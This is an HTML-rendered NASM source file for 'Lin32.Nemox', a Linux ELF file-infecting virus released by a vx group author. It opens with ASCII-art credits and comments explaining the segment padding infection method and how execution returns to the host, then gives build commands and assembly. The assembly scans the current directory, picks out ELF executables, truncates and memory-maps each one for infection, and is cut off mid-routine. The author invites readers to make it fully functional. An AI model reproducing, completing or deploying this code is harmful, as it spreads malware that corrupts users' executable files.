<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>nemox.asm</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;     .........................................................</span><span class="sc0">
</span><span class="sc1">;     :         ____ ___.__. ____   ____  _______  ___        :</span><span class="sc0">
</span><span class="sc1">;     :       _/ ___&lt;   |  |/    \_/ __ \/  _ \  \/  /        :</span><span class="sc0">
</span><span class="sc1">;     :       \  \___\___  |   |  \  ___(  &lt;_&gt; &gt;    &lt;         :</span><span class="sc0">
</span><span class="sc1">;     :        \___  &gt; ____|___|  /\___  &gt;____/__/\_ \        :</span><span class="sc0">
</span><span class="sc1">;     :            \/\/         \/     \/           \/        :</span><span class="sc0">
</span><span class="sc1">;     :                   __www.cyneox.tk_                    :</span><span class="sc0">
</span><span class="sc1">;     :                                                       :</span><span class="sc0">
</span><span class="sc1">;     :                                                       :</span><span class="sc0">
</span><span class="sc1">;     :                        member of                      :</span><span class="sc0">
</span><span class="sc1">;     :                                                       :</span><span class="sc0">
</span><span class="sc1">;     :             _______  _________     _____              :</span><span class="sc0">
</span><span class="sc1">;     :            \______ \ \_   ___ \   /  _  \             :</span><span class="sc0">
</span><span class="sc1">;     :             |    |  \/    \  \/  /  /_\  \            :</span><span class="sc0">
</span><span class="sc1">;     :             |    `   \     \____/    |    \           :</span><span class="sc0">
</span><span class="sc1">;     :            /_______  /\______  /\____|__  /           :</span><span class="sc0">
</span><span class="sc1">;     :                    \/        \/         \/            :</span><span class="sc0">
</span><span class="sc1">;     :                ( Dark Coderz Attitude )               :</span><span class="sc0">
</span><span class="sc1">;     :                   __www.dca-vx.tk__                   :</span><span class="sc0">
</span><span class="sc1">;     :.......................................................:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;                    * * * * * * * * * * * * * *</span><span class="sc0">
</span><span class="sc1">;                  ** Lin32.Nemox by cyneox/DCA **</span><span class="sc0">
</span><span class="sc1">;                    * * * * * * * * * * * * * *</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;     |-------------------------------------------------------|</span><span class="sc0">
</span><span class="sc1">;     |                     INTRODUCING                       |</span><span class="sc0">
</span><span class="sc1">;     |-------------------------------------------------------|</span><span class="sc0">
</span><span class="sc1">;         Nemo = "nobody".Probably you're asking yourself</span><span class="sc0">
</span><span class="sc1">;         why did I take this name for this *creation*.</span><span class="sc0">
</span><span class="sc1">;         Well its a long story...As my ex-girlfriend was</span><span class="sc0">
</span><span class="sc1">;         mean to me , I felt like a "nobody".So I decided</span><span class="sc0">
</span><span class="sc1">;         to call my new *half* virus : Nemox.Quite interes-</span><span class="sc0">
</span><span class="sc1">;         ting , isnt it !? ;)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;         It took a very long time to write this fucking </span><span class="sc0">
</span><span class="sc1">;         source coz ASM was new to me and unfriendly ;(.</span><span class="sc0">
</span><span class="sc1">;         I had to suspend this project coz at that moment</span><span class="sc0">
</span><span class="sc1">;         I had no idea how to solve some problems etc.And </span><span class="sc0">
</span><span class="sc1">;         then I've started with "Nf3ct0r" which was written</span><span class="sc0">
</span><span class="sc1">;         in C ( quite simple ).I've noticed ASM isnt so hard</span><span class="sc0">
</span><span class="sc1">;         to learn.You need time to explore it.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;         I had to learn that not everything will work under </span><span class="sc0">
</span><span class="sc1">;         ASM... I know you might say : "Everything is po-</span><span class="sc0">
</span><span class="sc1">;         ssible blah blah."You're right : When you concen-</span><span class="sc0">
</span><span class="sc1">;         trate on your work then you'll achieve your expec-</span><span class="sc0">
</span><span class="sc1">;         tations too.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;         I hope I'll have enough time to write more ASM virii</span><span class="sc0">
</span><span class="sc1">;         coz my main programming language was/is still C.</span><span class="sc0">
</span><span class="sc1">;         I love ASM too but C is simply easier to code...</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;     |-------------------------------------------------------|</span><span class="sc0">
</span><span class="sc1">;     |                   ABOUT Lin32.Nemox                   |</span><span class="sc0">
</span><span class="sc1">;     |-------------------------------------------------------|</span><span class="sc0">
</span><span class="sc1">;         Lin32.Nemox is a half virus which will infect any</span><span class="sc0">
</span><span class="sc1">;         ELF files in the current directory: "." .I've wrote</span><span class="sc0">
</span><span class="sc1">;         some lame functions which will search for ELF files</span><span class="sc0">
</span><span class="sc1">;         check if they are infectable or not and then start</span><span class="sc0">
</span><span class="sc1">;         the infection procedure.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;         It is using the common "Segment Padding Infection"</span><span class="sc0">
</span><span class="sc1">;         procedure.That means : segments needed for execution</span><span class="sc0">
</span><span class="sc1">;         will be padded properly to reflect the insertion</span><span class="sc0">
</span><span class="sc1">;         of our virus code.We will copy our virus code after</span><span class="sc0">
</span><span class="sc1">;         the code segment ( between .text and .data ).</span><span class="sc0">
</span><span class="sc1">;         Then we will update the PHDR(Program Header) and </span><span class="sc0">
</span><span class="sc1">;         SHDR(Sections Header) so that they contain the cor-</span><span class="sc0">
</span><span class="sc1">;         rect information about the file which has been </span><span class="sc0">
</span><span class="sc1">;         "infected".</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;         Nemox is using the same technique which I've used</span><span class="sc0">
</span><span class="sc1">;         when I coded Nfect0r.So if you didnt get it just </span><span class="sc0">
</span><span class="sc1">;         search for Nf3ct0r ;6) . Q.:Why a half virus !?</span><span class="sc0">
</span><span class="sc1">;         R.: well I dont want that stupid user will simply</span><span class="sc0">
</span><span class="sc1">;         execute my binaries and getting infected( I mean </span><span class="sc0">
</span><span class="sc1">;         the whole system) without knowing that.If they</span><span class="sc0">
</span><span class="sc1">;         want to transform my source codes into fully </span><span class="sc0">
</span><span class="sc1">;         functionable viruses they should do that at their</span><span class="sc0">
</span><span class="sc1">;         own risk.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;         A virus which is executing only his own virus code</span><span class="sc0">
</span><span class="sc1">;         is a dead virus.So I've chosed a simply method how</span><span class="sc0">
</span><span class="sc1">;         to return to the host code...At the beginning of </span><span class="sc0">
</span><span class="sc1">;         my virus code I wrote : "push dword 0x0".Later on</span><span class="sc0">
</span><span class="sc1">;         the "0x0" will be replaced with the original entry</span><span class="sc0">
</span><span class="sc1">;         point of the host file.At the end of the virus code</span><span class="sc0">
</span><span class="sc1">;         I wrote "ret" which will return the programm execu-</span><span class="sc0">
</span><span class="sc1">;         tion to "push dword [original entry point".Its quite</span><span class="sc0">
</span><span class="sc1">;         simple to understand and isnt so suspicious like </span><span class="sc0">
</span><span class="sc1">;         a "jmp" procedure.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;         Many ppl have told to me I shouldnt use "much" </span><span class="sc0">
</span><span class="sc1">;         stack in my programm.Well it does.I didnt want to</span><span class="sc0">
</span><span class="sc1">;         use a temporary file were I could write all that</span><span class="sc0">
</span><span class="sc1">;         info about the target: entry point , several </span><span class="sc0">
</span><span class="sc1">;         offsets , file size , file name etc.If u want to</span><span class="sc0">
</span><span class="sc1">;         improve that feel free and just do it...</span><span class="sc0">
</span><span class="sc1">;         I always use the stack for data storage etc.Its </span><span class="sc0">
</span><span class="sc1">;         "cheap" and simply usable.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;         Well I'm so happy that I've finished this project</span><span class="sc0">
</span><span class="sc1">;         although my work wasnt so "perfect": After infec-</span><span class="sc0">
</span><span class="sc1">;         ting several executables I've realized that the</span><span class="sc0">
</span><span class="sc1">;         string table got fucked up , that means I couldnt</span><span class="sc0">
</span><span class="sc1">;         see the names of several section etc.Well thats </span><span class="sc0">
</span><span class="sc1">;         very vulnerable to many AV's but thats not my </span><span class="sc0">
</span><span class="sc1">;         problem.If u want to improve this code just do it</span><span class="sc0">
</span><span class="sc1">;         and make it even better ;) </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;         What really mathers to me , is that Lin32.Nemox </span><span class="sc0">
</span><span class="sc1">;         really worked that way I wanted to...</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;     |-------------------------------------------------------|</span><span class="sc0">
</span><span class="sc1">;     |                      HOW TO...                        |</span><span class="sc0">
</span><span class="sc1">;     |-------------------------------------------------------|</span><span class="sc0">
</span><span class="sc1">;         cyneox@dca:~&gt;nasm -f elf -o nemox.o nemox.asm</span><span class="sc0">
</span><span class="sc1">;         cyneox@dca:~&gt;ld -o nemox nemox.o</span><span class="sc0">


</span><span class="sc9">%define</span><span class="sc0"> </span><span class="sc5">SZ_STACK</span><span class="sc0"> </span><span class="sc2">1000</span><span class="sc0">
</span><span class="sc9">%define</span><span class="sc0"> </span><span class="sc5">SZ_EHDR</span><span class="sc0"> </span><span class="sc2">564</span><span class="sc0">          </span><span class="sc1">; sizeof(struct ehdr)</span><span class="sc0">
</span><span class="sc9">%define</span><span class="sc0"> </span><span class="sc5">SZ_MMAP</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc0">
</span><span class="sc9">%define</span><span class="sc0"> </span><span class="sc5">ELF</span><span class="sc0"> </span><span class="sc2">464c457fh</span><span class="sc0">
</span><span class="sc9">%define</span><span class="sc0"> </span><span class="sc5">PT_LOAD</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc9">%define</span><span class="sc0"> </span><span class="sc5">PT_DYNAMIC</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc9">%define</span><span class="sc0"> </span><span class="sc5">PT_PHDR</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
</span><span class="sc9">%define</span><span class="sc0"> </span><span class="sc5">TEXT_SECT</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">          </span><span class="sc1">; phdr[2] - .text section</span><span class="sc0">
</span><span class="sc9">%define</span><span class="sc0"> </span><span class="sc5">DATA_SECT</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">          </span><span class="sc1">; phdr[3] - .data section</span><span class="sc0">
</span><span class="sc9">%define</span><span class="sc0"> </span><span class="sc5">E_ENTRY</span><span class="sc0"> </span><span class="sc2">0x18</span><span class="sc0">         </span><span class="sc1">; offset to entry point of file</span><span class="sc0">
</span><span class="sc9">%define</span><span class="sc0"> </span><span class="sc5">SYS_READDIR</span><span class="sc0"> </span><span class="sc2">89</span><span class="sc0">
</span><span class="sc9">%define</span><span class="sc0"> </span><span class="sc5">SYS_READ</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc9">%define</span><span class="sc0"> </span><span class="sc5">SYS_WRITE</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc9">%define</span><span class="sc0"> </span><span class="sc5">SYS_OPEN</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
</span><span class="sc9">%define</span><span class="sc0"> </span><span class="sc5">SYS_CLOSE</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
</span><span class="sc9">%define</span><span class="sc0"> </span><span class="sc5">SYS_UNLINK</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0"> 
</span><span class="sc9">%define</span><span class="sc0"> </span><span class="sc5">SYS_LSEEK</span><span class="sc0"> </span><span class="sc2">19</span><span class="sc0">
</span><span class="sc9">%define</span><span class="sc0"> </span><span class="sc5">SYS_MMAP</span><span class="sc0"> </span><span class="sc2">90</span><span class="sc0">
</span><span class="sc9">%define</span><span class="sc0"> </span><span class="sc5">SYS_MUNMAP</span><span class="sc0"> </span><span class="sc2">91</span><span class="sc0">
</span><span class="sc9">%define</span><span class="sc0"> </span><span class="sc5">SYS_FTRUNCATE</span><span class="sc0"> </span><span class="sc2">93</span><span class="sc0">
</span><span class="sc9">%define</span><span class="sc0"> </span><span class="sc5">SYS_FSTAT</span><span class="sc0"> </span><span class="sc2">108</span><span class="sc0">

</span><span class="sc9">section</span><span class="sc0"> </span><span class="sc10">.text</span><span class="sc0">
</span><span class="sc9">global</span><span class="sc0"> </span><span class="sc5">_start</span><span class="sc0">

</span><span class="sc5">_start</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc1">; saving registers : (normal) registers</span><span class="sc0">
       </span><span class="sc1">;                  : flag resgisters</span><span class="sc0">
                  </span><span class="sc6">pusha</span><span class="sc0">
          </span><span class="sc6">pushf</span><span class="sc0">

          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">hi_baby</span><span class="sc0">

</span><span class="sc5">hi_baby</span><span class="sc4">:</span><span class="sc0">
                  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
          </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc5">hi_baby</span><span class="sc0">         </span><span class="sc1">; ebp=0</span><span class="sc0">
          </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc5">SZ_STACK</span><span class="sc0">        </span><span class="sc1">; reserving memory for stack...</span><span class="sc0">

          </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">point</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; opening current working directory "."</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">sys.open</span><span class="sc0">

          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">SZ_STACK</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; saving fd to stack</span><span class="sc0">

          </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
          </span><span class="sc6">jge</span><span class="sc0"> </span><span class="sc5">e_bine</span><span class="sc0">              </span><span class="sc1">; good fd :p</span><span class="sc0">
          </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">close</span><span class="sc0">


</span><span class="sc5">e_bine</span><span class="sc4">:</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">             </span><span class="sc1">; move to ecx the address of stack</span><span class="sc0">
                                  </span><span class="sc1">; -&gt; needed for the sys call : readdir()</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">SZ_STACK</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; fd</span><span class="sc0">

</span><span class="sc5">readdir</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc1">; this function "readdir" should be recursive</span><span class="sc0">
    </span><span class="sc1">; we'll call it everytime we find a file in the directory</span><span class="sc0">

              </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">sys.readdir</span><span class="sc0">

          </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">; eax should be 1</span><span class="sc0">
          </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ok_dir</span><span class="sc0">
          </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">close</span><span class="sc0">

</span><span class="sc5">ok_dir</span><span class="sc4">:</span><span class="sc0">
                  </span><span class="sc6">pushad</span><span class="sc0">                  </span><span class="sc1">; saving registers</span><span class="sc0">

          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">; ecx = addr of stack</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">              </span><span class="sc1">; 10 = offset to file name</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">SZ_STACK</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc1">; saving file name to stack</span><span class="sc0">

          </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">               </span><span class="sc1">; O_RDWR</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">sys.open</span><span class="sc0">

          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">SZ_STACK</span><span class="sc4">-</span><span class="sc2">12</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; saving fd (of file) to stack</span><span class="sc0">
          </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
          </span><span class="sc6">jg</span><span class="sc0"> </span><span class="sc5">check_file</span><span class="sc0">

</span><span class="sc5">close2</span><span class="sc4">:</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">SZ_STACK</span><span class="sc4">-</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; fd</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">sys.close</span><span class="sc0">
          </span><span class="sc6">popad</span><span class="sc0">                   </span><span class="sc1">; restoring registers</span><span class="sc0">
          </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">readdir</span><span class="sc0">

</span><span class="sc5">check_file</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc1">; check if file is executable or not...</span><span class="sc0">
    </span><span class="sc1">; remember: ELF files have an "ELF" on the beginning</span><span class="sc0">
    </span><span class="sc1">; of the file...</span><span class="sc0">

          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">SZ_STACK</span><span class="sc4">-</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; fd</span><span class="sc0">
          </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc5">SZ_EHDR</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">SZ_EHDR</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">sys.read</span><span class="sc0">

          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">ELF</span><span class="sc0">
          </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0"> </span><span class="sc5">back</span><span class="sc0">

              </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc2">02h</span><span class="sc0">  </span><span class="sc1">; is executable ???</span><span class="sc0">
          </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0"> </span><span class="sc5">back</span><span class="sc0">

</span><span class="sc5">is_exec</span><span class="sc4">:</span><span class="sc0">

       </span><span class="sc1">; searching for the pht entry containing the .text segment</span><span class="sc0">
       </span><span class="sc1">; we want to infect our host file between the end of the .text</span><span class="sc0">
       </span><span class="sc1">; section and the beginning of the .data section</span><span class="sc0">

                  </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">             </span><span class="sc1">; 20h = offset to next PHT entry</span><span class="sc0">
          </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; p_offset; loadable ???</span><span class="sc0">
          </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">is_exec</span><span class="sc0">

          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; p_memsz</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">SZ_EHDR</span><span class="sc4">+</span><span class="sc5">SZ_STACK</span><span class="sc4">-</span><span class="sc2">16</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; saving p_memsz to stack</span><span class="sc0">
              </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0fh</span><span class="sc0">
          </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">vircode_len</span><span class="sc0">  
          </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">close2</span><span class="sc0">

          </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">            </span><span class="sc1">; esi = vir size</span><span class="sc0">

          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">SZ_EHDR</span><span class="sc4">+</span><span class="sc5">SZ_STACK</span><span class="sc4">-</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; fd</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">sys.fstat</span><span class="sc0">


          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; st_size = file size</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">SZ_EHDR</span><span class="sc4">+</span><span class="sc5">SZ_STACK</span><span class="sc4">-</span><span class="sc2">20</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc1">; saving file sz to stack</span><span class="sc0">

    </span><span class="sc1">; truncate to new file size so it can</span><span class="sc0">
    </span><span class="sc1">; reflect the infection of our virus.</span><span class="sc0">
    
              </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">SZ_EHDR</span><span class="sc4">+</span><span class="sc5">SZ_STACK</span><span class="sc4">-</span><span class="sc2">24</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc1">; new file size</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">sys.ftruncate</span><span class="sc0">


          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">SZ_EHDR</span><span class="sc4">+</span><span class="sc5">SZ_STACK</span><span class="sc4">-</span><span class="sc2">24</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; (new)file size</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">SZ_EHDR</span><span class="sc4">+</span><span class="sc5">SZ_STACK</span><span class="sc4">-</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; fd</span><span class="sc0">

          </span><span class="sc1">; initialising mmap structure...</span><span class="sc0">
          </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc5">SZ_MMAP</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; int start</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">   </span><span class="sc1">; mapping whole file...-&gt;ecx = file sz</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc2">3</span><span class="sc0">     </span><span class="sc1">; PROT_READ+PROT_WRITE = READ_WRITE (3)</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">    </span><span class="sc1">; MAP_SHARED (1)</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">  </span><span class="sc1">; fd</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">; offset = 0</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">             </span><span class="sc1">; ptr to mmap structure</span><span class="sc0">
                  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">sys.mmap</span><span class="sc0">

          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc5">SZ_MMAP</span><span class="sc0">         </span><span class="sc1">; restoring data</span><span class="sc0">

          </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
          </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">ok_mmap</span><span class="sc0">

